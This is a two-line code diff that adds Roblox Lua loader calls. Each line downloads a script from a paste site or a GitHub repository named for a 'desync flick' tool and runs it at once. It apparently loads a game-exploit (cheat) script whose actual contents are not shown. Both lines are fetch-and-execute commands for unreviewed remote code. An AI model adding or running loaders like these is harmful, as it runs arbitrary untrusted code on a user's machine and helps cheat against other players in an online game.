@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://pastefy.app/AtMulssY/raw"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/luffypets/Desync/refs/heads/main/desync_flick_v2.lua"))()
